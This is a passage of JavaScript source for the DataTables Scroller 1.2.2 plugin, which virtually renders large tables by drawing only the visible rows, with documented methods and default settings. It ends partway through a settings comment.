/*! Scroller 1.2.2
 * ©2011-2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     Scroller
 * @description Virtual rendering for DataTables
 * @version     1.2.2
 * @file        dataTables.scroller.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2011-2014 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function(window, document, undefined){


var factory = function( $, DataTable ) {
"use strict";

/**
 * Scroller is a virtual rendering plug-in for DataTables which allows large
 * datasets to be drawn on screen every quickly. What the virtual rendering means
 * is that only the visible portion of the table (and a bit to either side to make
 * the scrolling smooth) is drawn, while the scrolling container gives the
 * visual impression that the whole table is visible. This is done by making use
 * of the pagination abilities of DataTables and moving the table around in the
 * scrolling container DataTables adds to the page. The scrolling container is
 * forced to the height it would be for the full table display using an extra
 * element.
 *
 * Note that rows in the table MUST all be the same height. Information in a cell
 * which expands on to multiple lines will cause some odd behaviour in the scrolling.
 *
 * Scroller is initialised by simply including the letter 'S' in the sDom for the
 * table you want to have this feature enabled on. Note that the 'S' must come
 * AFTER the 't' parameter in `dom`.
 *
 * Key features include:
 *   <ul class="limit_length">
 *     <li>Speed! The aim of Scroller for DataTables is to make rendering large data sets fast</li>
 *     <li>Full compatibility with deferred rendering in DataTables 1.9 for maximum speed</li>
 *     <li>Display millions of rows</li>
 *     <li>Integration with state saving in DataTables (scrolling position is saved)</li>
 *     <li>Easy to use</li>
 *   </ul>
 *
 *  @class
 *  @constructor
 *  @global
 *  @param {object} oDT DataTables settings object
 *  @param {object} [oOpts={}] Configuration object for FixedColumns. Options 
 *    are defined by {@link Scroller.defaults}
 *
 *  @requires jQuery 1.7+
 *  @requires DataTables 1.9.0+
 *
 *  @example
 *    $(document).ready(function() {
 *        $('#example').dataTable( {
 *            "sScrollY": "200px",
 *            "sAjaxSource": "media/dataset/large.txt",
 *            "sDom": "frtiS",
 *            "bDeferRender": true
 *        } );
 *    } );
 */
var Scroller = function ( oDTSettings, oOpts ) {
	/* Sanity check - you just know it will happen */
	if ( ! this instanceof Scroller )
	{
		alert( "Scroller warning: Scroller must be initialised with the 'new' keyword." );
		return;
	}

	if ( typeof oOpts == 'undefined' )
	{
		oOpts = {};
	}

	/**
	 * Settings object which contains customisable information for the Scroller instance
	 * @namespace
	 * @private
	 * @extends Scroller.defaults
	 */
	this.s = {
		/**
		 * DataTables settings object
		 *  @type     object
		 *  @default  Passed in as first parameter to constructor
		 */
		"dt": oDTSettings,

		/**
		 * Pixel location of the top of the drawn table in the viewport
		 *  @type     int
		 *  @default  0
		 */
		"tableTop": 0,

		/**
		 * Pixel location of the bottom of the drawn table in the viewport
		 *  @type     int
		 *  @default  0
		 */
		"tableBottom": 0,

		/**
		 * Pixel location of the boundary for when the next data set should be loaded and drawn
		 * when scrolling up the way.
		 *  @type     int
		 *  @default  0
		 *  @private
		 */
		"redrawTop": 0,

		/**
		 * Pixel location of the boundary for when the next data set should be loaded and drawn
		 * when scrolling down the way. Note that this is actually calculated as the offset from
		 * the top.
		 *  @type     int
		 *  @default  0
		 *  @private
		 */
		"redrawBottom": 0,

		/**
		 * Auto row height or not indicator
		 *  @type     bool
		 *  @default  0
		 */
		"autoHeight": true,

		/**
		 * Number of rows calculated as visible in the visible viewport
		 *  @type     int
		 *  @default  0
		 */
		"viewportRows": 0,

		/**
		 * setTimeout reference for state saving, used when state saving is enabled in the DataTable
		 * and when the user scrolls the viewport in order to stop the cookie set taking too much
		 * CPU!
		 *  @type     int
		 *  @default  0
		 */
		"stateTO": null,

		/**
		 * setTimeout reference for the redraw, used when server-side processing is enabled in the
		 * DataTables in order to prevent DoSing the server
		 *  @type     int
		 *  @default  null
		 */
		"drawTO": null,

		heights: {
			jump: null,
			page: null,
			virtual: null,
			scroll: null,

			/**
			 * Height of rows in the table
			 *  @type     int
			 *  @default  0
			 */
			row: null,

			/**
			 * Pixel height of the viewport
			 *  @type     int
			 *  @default  0
			 */
			viewport: null
		},

		topRowFloat: 0,
		scrollDrawDiff: null,
		loaderVisible: false
	};

	// @todo The defaults should extend a `c` property and the internal settings
	// only held in the `s` property. At the moment they are mixed
	this.s = $.extend( this.s, Scroller.oDefaults, oOpts );

	// Workaround for row height being read from height object (see above comment)
	this.s.heights.row = this.s.rowHeight;

	/**
	 * DOM elements used by the class instance
	 * @private
	 * @namespace
	 *
	 */
	this.dom = {
		"force":    document.createElement('div'),
		"scroller": null,
		"table":    null,
		"loader":   null
	};

	/* Attach the instance to the DataTables instance so it can be accessed */
	this.s.dt.oScroller = this;

	/* Let's do it */
	this._fnConstruct();
};



Scroller.prototype = /** @lends Scroller.prototype */{
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Public methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Calculate the pixel position from the top of the scrolling container for
	 * a given row
	 *  @param {int} iRow Row number to calculate the position of
	 *  @returns {int} Pixels
	 *  @example
	 *    $(document).ready(function() {
	 *      $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sAjaxSource": "media/dataset/large.txt",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "fnInitComplete": function (o) {
	 *          // Find where row 25 is
	 *          alert( o.oScroller.fnRowToPixels( 25 ) );
	 *        }
	 *      } );
	 *    } );
	 */
	"fnRowToPixels": function ( rowIdx, intParse, virtual )
	{
		var pixels;

		if ( virtual ) {
			pixels = this._domain( 'virtualToPhysical', rowIdx * this.s.heights.row );
		}
		else {
			var diff = rowIdx - this.s.baseRowTop;
			pixels = this.s.baseScrollTop + (diff * this.s.heights.row);
		}

		return intParse || intParse === undefined ?
			parseInt( pixels, 10 ) :
			pixels;
	},


	/**
	 * Calculate the row number that will be found at the given pixel position
	 * (y-scroll).
	 *
	 * Please note that when the height of the full table exceeds 1 million
	 * pixels, Scroller switches into a non-linear mode for the scrollbar to fit
	 * all of the records into a finite area, but this function returns a linear
	 * value (relative to the last non-linear positioning).
	 *  @param {int} iPixels Offset from top to calculate the row number of
	 *  @param {int} [intParse=true] If an integer value should be returned
	 *  @param {int} [virtual=false] Perform the calculations in the virtual domain
	 *  @returns {int} Row index
	 *  @example
	 *    $(document).ready(function() {
	 *      $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sAjaxSource": "media/dataset/large.txt",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "fnInitComplete": function (o) {
	 *          // Find what row number is at 500px
	 *          alert( o.oScroller.fnPixelsToRow( 500 ) );
	 *        }
	 *      } );
	 *    } );
	 */
	"fnPixelsToRow": function ( pixels, intParse, virtual )
	{
		var diff = pixels - this.s.baseScrollTop;
		var row = virtual ?
			this._domain( 'physicalToVirtual', pixels ) / this.s.heights.row :
			( diff / this.s.heights.row ) + this.s.baseRowTop;

		return intParse || intParse === undefined ?
			parseInt( row, 10 ) :
			row;
	},


	/**
	 * Calculate the row number that will be found at the given pixel position (y-scroll)
	 *  @param {int} iRow Row index to scroll to
	 *  @param {bool} [bAnimate=true] Animate the transition or not
	 *  @returns {void}
	 *  @example
	 *    $(document).ready(function() {
	 *      $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sAjaxSource": "media/dataset/large.txt",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "fnInitComplete": function (o) {
	 *          // Immediately scroll to row 1000
	 *          o.oScroller.fnScrollToRow( 1000 );
	 *        }
	 *      } );
	 *     
	 *      // Sometime later on use the following to scroll to row 500...
	 *          var oSettings = $('#example').dataTable().fnSettings();
	 *      oSettings.oScroller.fnScrollToRow( 500 );
	 *    } );
	 */
	"fnScrollToRow": function ( iRow, bAnimate )
	{
		var that = this;
		var ani = false;
		var px = this.fnRowToPixels( iRow );

		// We need to know if the table will redraw or not before doing the
		// scroll. If it will not redraw, then we need to use the currently
		// displayed table, and scroll with the physical pixels. Otherwise, we
		// need to calculate the table's new position from the virtual
		// transform.
		var preRows = ((this.s.displayBuffer-1)/2) * this.s.viewportRows;
		var drawRow = iRow - preRows;
		if ( drawRow < 0 ) {
			drawRow = 0;
		}

		if ( (px > this.s.redrawBottom || px < this.s.redrawTop) && this.s.dt._iDisplayStart !== drawRow ) {
			ani = true;
			px = this.fnRowToPixels( iRow, false, true );
		}

		if ( typeof bAnimate == 'undefined' || bAnimate )
		{
			this.s.ani = ani;
			$(this.dom.scroller).animate( {
				"scrollTop": px
			}, function () {
				// This needs to happen after the animation has completed and
				// the final scroll event fired
				setTimeout( function () {
					that.s.ani = false;
				}, 25 );
			} );
		}
		else
		{
			$(this.dom.scroller).scrollTop( px );
		}
	},


	/**
	 * Calculate and store information about how many rows are to be displayed
	 * in the scrolling viewport, based on current dimensions in the browser's
	 * rendering. This can be particularly useful if the table is initially
	 * drawn in a hidden element - for example in a tab.
	 *  @param {bool} [bRedraw=true] Redraw the table automatically after the recalculation, with
	 *    the new dimensions forming the basis for the draw.
	 *  @returns {void}
	 *  @example
	 *    $(document).ready(function() {
	 *      // Make the example container hidden to throw off the browser's sizing
	 *      document.getElementById('container').style.display = "none";
	 *      var oTable = $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sAjaxSource": "media/dataset/large.txt",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "fnInitComplete": function (o) {
	 *          // Immediately scroll to row 1000
	 *          o.oScroller.fnScrollToRow( 1000 );
	 *        }
	 *      } );
	 *     
	 *      setTimeout( function () {
	 *        // Make the example container visible and recalculate the scroller sizes
	 *        document.getElementById('container').style.display = "block";
	 *        oTable.fnSettings().oScroller.fnMeasure();
	 *      }, 3000 );
	 */
	"fnMeasure": function ( bRedraw )
	{
		if ( this.s.autoHeight )
		{
			this._fnCalcRowHeight();
		}

		var heights = this.s.heights;

		heights.viewport = $(this.dom.scroller).height();
		this.s.viewportRows = parseInt( heights.viewport / heights.row, 10 )+1;
		this.s.dt._iDisplayLength = this.s.viewportRows * this.s.displayBuffer;

		if ( bRedraw === undefined || bRedraw )
		{
			this.s.dt.oInstance.fnDraw();
		}
	},



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods (they are of course public in JS, but recommended as private)
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/**
	 * Initialisation for Scroller
	 *  @returns {void}
	 *  @private
	 */
	"_fnConstruct": function ()
	{
		var that = this;

		/* Sanity check */
		if ( !this.s.dt.oFeatures.bPaginate ) {
			this.s.dt.oApi._fnLog( this.s.dt, 0, 'Pagination must be enabled for Scroller' );
			return;
		}

		/* Insert a div element that we can use to force the DT scrolling container to
		 * the height that would be required if the whole table was being displayed
		 */
		this.dom.force.style.position = "absolute";
		this.dom.force.style.top = "0px";
		this.dom.force.style.left = "0px";
		this.dom.force.style.width = "1px";

		this.dom.scroller = $('div.'+this.s.dt.oClasses.sScrollBody, this.s.dt.nTableWrapper)[0];
		this.dom.scroller.appendChild( this.dom.force );
		this.dom.scroller.style.position = "relative";

		this.dom.table = $('>table', this.dom.scroller)[0];
		this.dom.table.style.position = "absolute";
		this.dom.table.style.top = "0px";
		this.dom.table.style.left = "0px";

		// Add class to 'announce' that we are a Scroller table
		$(this.s.dt.nTableWrapper).addClass('DTS');

		// Add a 'loading' indicator
		if ( this.s.loadingIndicator )
		{
			this.dom.loader = $('<div class="DTS_Loading">'+this.s.dt.oLanguage.sLoadingRecords+'</div>')
				.css('display', 'none');

			$(this.dom.scroller.parentNode)
				.css('position', 'relative')
				.append( this.dom.loader );
		}

		/* Initial size calculations */
		if ( this.s.heights.row && this.s.heights.row != 'auto' )
		{
			this.s.autoHeight = false;
		}
		this.fnMeasure( false );

		/* Scrolling callback to see if a page change is needed - use a throttled
		 * function for the save save callback so we aren't hitting it on every
		 * scroll
		 */
		this.s.ingnoreScroll = true;
		this.s.stateSaveThrottle = this.s.dt.oApi._fnThrottle( function () {
			that.s.dt.oApi._fnSaveState( that.s.dt );
		}, 500 );
		$(this.dom.scroller).on( 'scroll.DTS', function (e) {
			that._fnScroll.call( that );
		} );

		/* In iOS we catch the touchstart event in case the user tries to scroll
		 * while the display is already scrolling
		 */
		$(this.dom.scroller).on('touchstart.DTS', function () {
			that._fnScroll.call( that );
		} );

		/* Update the scroller when the DataTable is redrawn */
		this.s.dt.aoDrawCallback.push( {
			"fn": function () {
				if ( that.s.dt.bInitialised ) {
					that._fnDrawCallback.call( that );
				}
			},
			"sName": "Scroller"
		} );

		/* On resize, update the information element, since the number of rows shown might change */
		$(window).on( 'resize.DTS', function () {
			that.fnMeasure( false );
			that._fnInfo();
		} );

		/* Add a state saving parameter to the DT state saving so we can restore the exact
		 * position of the scrolling
		 */
		var initialStateSave = true;
		this.s.dt.oApi._fnCallbackReg( this.s.dt, 'aoStateSaveParams', function (oS, oData) {
			/* Set iScroller to saved scroll position on initialization.
			 */
			if(initialStateSave && that.s.dt.oLoadedState){
				oData.iScroller = that.s.dt.oLoadedState.iScroller;
				oData.iScrollerTopRow = that.s.dt.oLoadedState.iScrollerTopRow;
				initialStateSave = false;
			} else {
				oData.iScroller = that.dom.scroller.scrollTop;
				oData.iScrollerTopRow = that.s.topRowFloat;
			}
		}, "Scroller_State" );

		if ( this.s.dt.oLoadedState ) {
			this.s.topRowFloat = this.s.dt.oLoadedState.iScrollerTopRow || 0;
		}

		/* Destructor */
		this.s.dt.aoDestroyCallback.push( {
			"sName": "Scroller",
			"fn": function () {
				$(window).off( 'resize.DTS' );
				$(that.dom.scroller).off('touchstart.DTS scroll.DTS');
				$(that.s.dt.nTableWrapper).removeClass('DTS');
				$('div.DTS_Loading', that.dom.scroller.parentNode).remove();

				that.dom.table.style.position = "";
				that.dom.table.style.top = "";
				that.dom.table.style.left = "";
			}
		} );
	},


	/**
	 * Scrolling function - fired whenever the scrolling position is changed.
	 * This method needs to use the stored values to see if the table should be
	 * redrawn as we are moving towards the end of the information that is
	 * currently drawn or not. If needed, then it will redraw the table based on
	 * the new position.
	 *  @returns {void}
	 *  @private
	 */
	"_fnScroll": function ()
	{
		var
			that = this,
			heights = this.s.heights,
			iScrollTop = this.dom.scroller.scrollTop,
			iTopRow;

		if ( this.s.skip ) {
			return;
		}

		if ( this.s.ingnoreScroll ) {
			return;
		}

		/* If the table has been sorted or filtered, then we use the redraw that
		 * DataTables as done, rather than performing our own
		 */
		if ( this.s.dt.bFiltered || this.s.dt.bSorted ) {
			this.s.lastScrollTop = 0;
			return;
		}

		/* Update the table's information display for what is now in the viewport */
		this._fnInfo();

		/* We don't want to state save on every scroll event - that's heavy
		 * handed, so use a timeout to update the state saving only when the
		 * scrolling has finished
		 */
		clearTimeout( this.s.stateTO );
		this.s.stateTO = setTimeout( function () {
			that.s.dt.oApi._fnSaveState( that.s.dt );
		}, 250 );

		/* Check if the scroll point is outside the trigger boundary which would required
		 * a DataTables redraw
		 */
		if ( iScrollTop < this.s.redrawTop || iScrollTop > this.s.redrawBottom ) {
			var preRows = Math.ceil( ((this.s.displayBuffer-1)/2) * this.s.viewportRows );

			if ( Math.abs( iScrollTop - this.s.lastScrollTop ) > heights.viewport || this.s.ani ) {
				iTopRow = parseInt(this._domain( 'physicalToVirtual', iScrollTop ) / heights.row, 10) - preRows;
				this.s.topRowFloat = (this._domain( 'physicalToVirtual', iScrollTop ) / heights.row);
			}
			else {
				iTopRow = this.fnPixelsToRow( iScrollTop ) - preRows;
				this.s.topRowFloat = this.fnPixelsToRow( iScrollTop, false );
			}

			if ( iTopRow <= 0 ) {
				/* At the start of the table */
				iTopRow = 0;
			}
			else if ( iTopRow + this.s.dt._iDisplayLength > this.s.dt.fnRecordsDisplay() ) {
				/* At the end of the table */
				iTopRow = this.s.dt.fnRecordsDisplay() - this.s.dt._iDisplayLength;
				if ( iTopRow < 0 ) {
					iTopRow = 0;
				}
			}
			else if ( iTopRow % 2 !== 0 ) {
				// For the row-striping classes (odd/even) we want only to start
				// on evens otherwise the stripes will change between draws and
				// look rubbish
				iTopRow++;
			}

			if ( iTopRow != this.s.dt._iDisplayStart ) {
				/* Cache the new table position for quick lookups */
				this.s.tableTop = $(this.s.dt.nTable).offset().top;
				this.s.tableBottom = $(this.s.dt.nTable).height() + this.s.tableTop;

				var draw =  function () {
					if ( that.s.scrollDrawReq === null ) {
						that.s.scrollDrawReq = iScrollTop;
					}

					that.s.dt._iDisplayStart = iTopRow;
					if ( that.s.dt.oApi._fnCalculateEnd ) { // Removed in 1.10
						that.s.dt.oApi._fnCalculateEnd( that.s.dt );
					}
					that.s.dt.oApi._fnDraw( that.s.dt );
				};

				/* Do the DataTables redraw based on the calculated start point - note that when
				 * using server-side processing we introduce a small delay to not DoS the server...
				 */
				if ( this.s.dt.oFeatures.bServerSide ) {
					clearTimeout( this.s.drawTO );
					this.s.drawTO = setTimeout( draw, this.s.serverWait );
				}
				else {
					draw();
				}

				if ( this.dom.loader && ! this.s.loaderVisible ) {
					this.dom.loader.css( 'display', 'block' );
					this.s.loaderVisible = true;
				}
			}
		}

		this.s.lastScrollTop = iScrollTop;
		this.s.stateSaveThrottle();
	},


	/**
	 * Convert from one domain to another. The physical domain is the actual
	 * pixel count on the screen, while the virtual is if we had browsers which
	 * had scrolling containers of infinite height (i.e. the absolute value)
	 *
	 *  @param {string} dir Domain transform direction, `virtualToPhysical` or
	 *    `physicalToVirtual` 
	 *  @returns {number} Calculated transform
	 *  @private
	 */
	_domain: function ( dir, val )
	{
		var heights = this.s.heights;
		var coeff;

		// If the virtual and physical height match, then we use a linear
		// transform between the two, allowing the scrollbar to be linear
		if ( heights.virtual === heights.scroll ) {
			coeff = (heights.virtual-heights.viewport) / (heights.scroll-heights.viewport);

			if ( dir === 'virtualToPhysical' ) {
				return val / coeff;
			}
			else if ( dir === 'physicalToVirtual' ) {
				return val * coeff;
			}
		}

		// Otherwise, we want a non-linear scrollbar to take account of the
		// redrawing regions at the start and end of the table, otherwise these
		// can stutter badly - on large tables 30px (for example) scroll might
		// be hundreds of rows, so the table would be redrawing every few px at
		// the start and end. Use a simple quadratic to stop this. It does mean
		// the scrollbar is non-linear, but with such massive data sets, the
		// scrollbar is going to be a best guess anyway
		var xMax = (heights.scroll - heights.viewport) / 2;
		var yMax = (heights.virtual - heights.viewport) / 2;

		coeff = yMax / ( xMax * xMax );

		if ( dir === 'virtualToPhysical' ) {
			if ( val < yMax ) {
				return Math.pow(val / coeff, 0.5);
			}
			else {
				val = (yMax*2) - val;
				return val < 0 ?
					heights.scroll :
					(xMax*2) - Math.pow(val / coeff, 0.5);
			}
		}
		else if ( dir === 'physicalToVirtual' ) {
			if ( val < xMax ) {
				return val * val * coeff;
			}
			else {
				val = (xMax*2) - val;
				return val < 0 ?
					heights.virtual :
					(yMax*2) - (val * val * coeff);
			}
		}
	},


	/**
	 * Draw callback function which is fired when the DataTable is redrawn. The main function of
	 * this method is to position the drawn table correctly the scrolling container for the rows
	 * that is displays as a result of the scrolling position.
	 *  @returns {void}
	 *  @private
	 */
	"_fnDrawCallback": function ()
	{
		var
			that = this,
			heights = this.s.heights,
			iScrollTop = this.dom.scroller.scrollTop,
			iActualScrollTop = iScrollTop,
			iScrollBottom = iScrollTop + heights.viewport,
			iTableHeight = $(this.s.dt.nTable).height(),
			displayStart = this.s.dt._iDisplayStart,
			displayLen = this.s.dt._iDisplayLength,
			displayEnd = this.s.dt.fnRecordsDisplay();

		// Disable the scroll event listener while we are updating the DOM
		this.s.skip = true;

		// Resize the scroll forcing element
		this._fnScrollForce();

		// Reposition the scrolling for the updated virtual position if needed
		if ( displayStart === 0 ) {
			// Linear calculation at the top of the table
			iScrollTop = this.s.topRowFloat * heights.row;
		}
		else if ( displayStart + displayLen >= displayEnd ) {
			// Linear calculation that the bottom as well
			iScrollTop = heights.scroll - ((displayEnd - this.s.topRowFloat) * heights.row);
		}
		else {
			// Domain scaled in the middle
			iScrollTop = this._domain( 'virtualToPhysical', this.s.topRowFloat * heights.row );
		}

		this.dom.scroller.scrollTop = iScrollTop;

		// Store positional information so positional calculations can be based
		// upon the current table draw position
		this.s.baseScrollTop = iScrollTop;
		this.s.baseRowTop = this.s.topRowFloat;

		// Position the table in the virtual scroller
		var tableTop = iScrollTop - ((this.s.topRowFloat - displayStart) * heights.row);
		if ( displayStart === 0 ) {
			tableTop = 0;
		}
		else if ( displayStart + displayLen >= displayEnd ) {
			tableTop = heights.scroll - iTableHeight;
		}

		this.dom.table.style.top = tableTop+'px';

		/* Cache some information for the scroller */
		this.s.tableTop = tableTop;
		this.s.tableBottom = iTableHeight + this.s.tableTop;

		// Calculate the boundaries for where a redraw will be triggered by the
		// scroll event listener
		var boundaryPx = (iScrollTop - this.s.tableTop) * this.s.boundaryScale;
		this.s.redrawTop = iScrollTop - boundaryPx;
		this.s.redrawBottom = iScrollTop + boundaryPx;

		this.s.skip = false;

		// Restore the scrolling position that was saved by DataTable's state
		// saving Note that this is done on the second draw when data is Ajax
		// sourced, and the first draw when DOM soured
		if ( this.s.dt.oFeatures.bStateSave && this.s.dt.oLoadedState !== null &&
			 typeof this.s.dt.oLoadedState.iScroller != 'undefined' )
		{
			// A quirk of DataTables is that the draw callback will occur on an
			// empty set if Ajax sourced, but not if server-side processing.
			var ajaxSourced = (this.s.dt.sAjaxSource || that.s.dt.ajax) && ! this.s.dt.oFeatures.bServerSide ?
				true :
				false;

			if ( ( ajaxSourced && this.s.dt.iDraw == 2) ||
			     (!ajaxSourced && this.s.dt.iDraw == 1) )
			{
				setTimeout( function () {
					$(that.dom.scroller).scrollTop( that.s.dt.oLoadedState.iScroller );
					that.s.redrawTop = that.s.dt.oLoadedState.iScroller - (heights.viewport/2);

					// In order to prevent layout thrashing we need another
					// small delay
					setTimeout( function () {
						that.s.ingnoreScroll = false;
					}, 0 );
				}, 0 );
			}
		}
		else {
			that.s.ingnoreScroll = false;
		}

		// Because of the order of the DT callbacks, the info update will
		// take precedence over the one we want here. So a 'thread' break is
		// needed
		setTimeout( function () {
			that._fnInfo.call( that );
		}, 0 );

		// Hide the loading indicator
		if ( this.dom.loader && this.s.loaderVisible ) {
			this.dom.loader.css( 'display', 'none' );
			this.s.loaderVisible = false;
		}
	},


	/**
	 * Force the scrolling container to have height beyond that of just the
	 * table that has been drawn so the user can scroll the whole data set.
	 *
	 * Note that if the calculated required scrolling height exceeds a maximum
	 * value (1 million pixels - hard-coded) the forcing element will be set
	 * only to that maximum value and virtual / physical domain transforms will
	 * be used to allow Scroller to display tables of any number of records.
	 *  @returns {void}
	 *  @private
	 */
	_fnScrollForce: function ()
	{
		var heights = this.s.heights;
		var max = 1000000;

		heights.virtual = heights.row * this.s.dt.fnRecordsDisplay();
		heights.scroll = heights.virtual;

		if ( heights.scroll > max ) {
			heights.scroll = max;
		}

		this.dom.force.style.height = heights.scroll+"px";
	},


	/**
	 * Automatic calculation of table row height. This is just a little tricky here as using
	 * initialisation DataTables has tale the table out of the document, so we need to create
	 * a new table and insert it into the document, calculate the row height and then whip the
	 * table out.
	 *  @returns {void}
	 *  @private
	 */
	"_fnCalcRowHeight": function ()
	{
		var dt = this.s.dt;
		var origTable = dt.nTable;
		var nTable = origTable.cloneNode( false );
		var tbody = $('<tbody/>').appendTo( nTable );
		var container = $(
			'<div class="'+dt.oClasses.sWrapper+' DTS">'+
				'<div class="'+dt.oClasses.sScrollWrapper+'">'+
					'<div class="'+dt.oClasses.sScrollBody+'"></div>'+
				'</div>'+
			'</div>'
		);

		// Want 3 rows in the sizing table so :first-child and :last-child
		// CSS styles don't come into play - take the size of the middle row
		$('tbody tr:lt(4)', origTable).clone().appendTo( tbody );
		while( $('tr', tbody).length < 3 ) {
			tbody.append( '<tr><td>&nbsp;</td></tr>' );
		}

		$('div.'+dt.oClasses.sScrollBody, container).append( nTable );

		var appendTo;
		if (dt._bInitComplete) {
			appendTo = origTable.parentNode;
		} else {
			if (!this.s.dt.nHolding) {
				this.s.dt.nHolding = $( '<div></div>' ).insertBefore( this.s.dt.nTable );
			}
			appendTo = this.s.dt.nHolding;
		}

		container.appendTo( appendTo );
		this.s.heights.row = $('tr', tbody).eq(1).outerHeight();
		container.remove();
	},


	/**
	 * Update any information elements that are controlled by the DataTable based on the scrolling
	 * viewport and what rows are visible in it. This function basically acts in the same way as
	 * _fnUpdateInfo in DataTables, and effectively replaces that function.
	 *  @returns {void}
	 *  @private
	 */
	"_fnInfo": function ()
	{
		if ( !this.s.dt.oFeatures.bInfo )
		{
			return;
		}

		var
			dt = this.s.dt,
			language = dt.oLanguage,
			iScrollTop = this.dom.scroller.scrollTop,
			iStart = Math.floor( this.fnPixelsToRow(iScrollTop, false, this.s.ani)+1 ),
			iMax = dt.fnRecordsTotal(),
			iTotal = dt.fnRecordsDisplay(),
			iPossibleEnd = Math.ceil( this.fnPixelsToRow(iScrollTop+this.s.heights.viewport, false, this.s.ani) ),
			iEnd = iTotal < iPossibleEnd ? iTotal : iPossibleEnd,
			sStart = dt.fnFormatNumber( iStart ),
			sEnd = dt.fnFormatNumber( iEnd ),
			sMax = dt.fnFormatNumber( iMax ),
			sTotal = dt.fnFormatNumber( iTotal ),
			sOut;

		if ( dt.fnRecordsDisplay() === 0 &&
			   dt.fnRecordsDisplay() == dt.fnRecordsTotal() )
		{
			/* Empty record set */
			sOut = language.sInfoEmpty+ language.sInfoPostFix;
		}
		else if ( dt.fnRecordsDisplay() === 0 )
		{
			/* Empty record set after filtering */
			sOut = language.sInfoEmpty +' '+
				language.sInfoFiltered.replace('_MAX_', sMax)+
					language.sInfoPostFix;
		}
		else if ( dt.fnRecordsDisplay() == dt.fnRecordsTotal() )
		{
			/* Normal record set */
			sOut = language.sInfo.
					replace('_START_', sStart).
					replace('_END_',   sEnd).
					replace('_MAX_',   sMax).
					replace('_TOTAL_', sTotal)+
				language.sInfoPostFix;
		}
		else
		{
			/* Record set after filtering */
			sOut = language.sInfo.
					replace('_START_', sStart).
					replace('_END_',   sEnd).
					replace('_MAX_',   sMax).
					replace('_TOTAL_', sTotal) +' '+
				language.sInfoFiltered.replace(
					'_MAX_',
					dt.fnFormatNumber(dt.fnRecordsTotal())
				)+
				language.sInfoPostFix;
		}

		var callback = language.fnInfoCallback;
		if ( callback ) {
			sOut = callback.call( dt.oInstance,
				dt, iStart, iEnd, iMax, iTotal, sOut
			);
		}

		var n = dt.aanFeatures.i;
		if ( typeof n != 'undefined' )
		{
			for ( var i=0, iLen=n.length ; i<iLen ; i++ )
			{
				$(n[i]).html( sOut );
			}
		}
	}
};



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Statics
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */


/**
 * Scroller default settings for initialisation
 *  @namespace
 *  @name Scroller.defaults
 *  @static
 */
Scroller.defaults = /** @lends Scroller.defaults */{
	/**
	 * Indicate if Scroller show show trace information on the console or not. This can be
	 * useful when debugging Scroller or if just curious as to what it is doing, but should
	 * be turned off for production.
	 *  @type     bool
	 *  @default  false
	 *  @static
	 *  @example
	 *    var oTable = $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "oScroller": {
	 *          "trace": true
	 *        }
	 *    } );
	 */
	"trace": false,

	/**
	 * Scroller will attempt to automatically calculate the height of rows for it's internal
	 * calculations. However the height that is used can be overridden using this parameter.
	 *  @type     int|string
	 *  @default  auto
	 *  @static
	 *  @example
	 *    var oTable = $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "oScroller": {
	 *          "rowHeight": 30
	 *        }
	 *    } );
	 */
	"rowHeight": "auto",

	/**
	 * When using server-side processing, Scroller will wait a small amount of time to allow
	 * the scrolling to finish before requesting more data from the server. This prevents
	 * you from DoSing your own server! The wait time can be configured by this parameter.
	 *  @type     int
	 *  @default  200
	 *  @static
	 *  @example
	 *    var oTable = $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "oScroller": {
	 *          "serverWait": 100
	 *        }
	 *    } );
	 */
	"serverWait": 200,

	/**
	 * The display buffer is what Scroller uses to calculate how many rows it should pre-fetch
	 * for scrolling. Scroller automatically adjusts DataTables' display length to pre-fetch
	 * rows that will be shown in "near scrolling" (i.e. just beyond the current display area).
	 * The value is based upon the number of rows that can be displayed in the viewport (i.e.
	 * a value of 1), and will apply the display range to records before before and after the
	 * current viewport - i.e. a factor of 3 will allow Scroller to pre-fetch 1 viewport's worth
	 * of rows before the current viewport, the current viewport's rows and 1 viewport's worth
	 * of rows after the current viewport. Adjusting this value can be useful for ensuring
	 * smooth scrolling based on your data set.
	 *  @type     int
	 *  @default  7
	 *  @static
	 *  @example
	 *    var oTable = $('#example').dataTable( {
	 *        "sScrollY": "200px",
	 *        "sDom": "frtiS",
	 *        "bDeferRender": true,
	 *        "oScroller": {
	 *          "displayBuffer": 10
	 *        }
	 *    } );
	 */
	"displayBuffer": 9,

	/**
	 * Scroller uses the boundary scaling factor to decide when to redraw the table - which it
	 * typically does before you reach the end of the currently loaded data set (in order to
	 * allow the data to look continuous to a user scrolling through the data). If given as 0
	 * then the table will be redrawn whenever the viewport is scrolled, while 1 would not
